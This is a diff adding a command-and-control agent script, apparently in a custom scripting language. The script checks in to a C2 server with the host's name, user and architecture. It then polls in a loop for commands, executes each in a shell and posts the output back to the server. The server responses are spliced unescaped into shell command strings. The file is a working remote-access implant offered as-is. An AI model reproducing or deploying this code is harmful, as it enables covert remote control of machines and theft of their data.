@@ -1,0 +1,88 @@
+# Jockey C2 agent — talks HTTP through system_shell (curl).
+# Real net_* builtins coming in phase 4 will replace the curl calls.
+
+let C2    = "http://127.0.0.1:8080"
+let KEY   = "changeme-agent-key"
+let SID   = ""
+
+let host = system_hostname()
+let user = system_username()
+let arch = system_arch()
+
+let body = "{\"id\":null,\"hostname\":\"" + host
+         + "\",\"user\":\"" + user
+         + "\",\"os\":\"Linux\",\"arch\":\"" + arch
+         + "\",\"pid\":0}"
+
+let checkin = system_shell(
+    "curl -s -X POST -H 'X-Agent-Key: " + KEY
+    + "' -H 'Content-Type: application/json'"
+    + " -d '" + body + "' " + C2 + "/agent/checkin"
+)
+print("checkin:", checkin)
+
+# Extract id naively (no JSON parser in core builtins yet)
+# Format: {"id":"abc123"}
+let q1 = 0 - 1
+let q2 = 0 - 1
+let i  = 0
+for c in checkin {
+    if c == "\"" {
+        if q1 == 0 - 1 { q1 = i }
+        elif q2 == 0 - 1 { q2 = i }
+    }
+    i = i + 1
+}
+
+# Fallback: use a small python one-liner to parse
+let sid = system_shell(
+    "echo '" + checkin + "' | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"id\"])'"
+)
+# strip trailing newline
+let sid_clean = ""
+for c in sid {
+    if c != "\n" { sid_clean = sid_clean + c }
+}
+SID = sid_clean
+print("session:", SID)
+
+# Beacon loop
+let running = true
+while running {
+    let beacon = system_shell(
+        "curl -s -H 'X-Agent-Key: " + KEY + "' "
+        + C2 + "/agent/beacon/" + SID
+    )
+
+    if len(beacon) > 0 and beacon != "\n" {
+        print("job:", beacon)
+
+        # Extract cmd_id and cmd via python one-liner
+        let cid = system_shell(
+            "echo '" + beacon + "' | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"cmd_id\"])'"
+        )
+        let cmd = system_shell(
+            "echo '" + beacon + "' | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"cmd\"])'"
+        )
+
+        # strip newlines
+        let cid_c = ""
+        for c in cid { if c != "\n" { cid_c = cid_c + c } }
+        let cmd_c = ""
+        for c in cmd { if c != "\n" { cmd_c = cmd_c + c } }
+
+        print("exec:", cmd_c)
+        let out = system_shell(cmd_c)
+
+        # submit result
+        let res_body = "{\"cmd_id\":" + cid_c + ",\"result\":" + "\"" + out + "\"}"
+        system_shell(
+            "curl -s -X POST -H 'X-Agent-Key: " + KEY
+            + "' -H 'Content-Type: application/json'"
+            + " -d '" + res_body + "' "
+            + C2 + "/agent/result/" + SID
+        )
+    } else {
+        system_sleep(2000)
+    }
+}
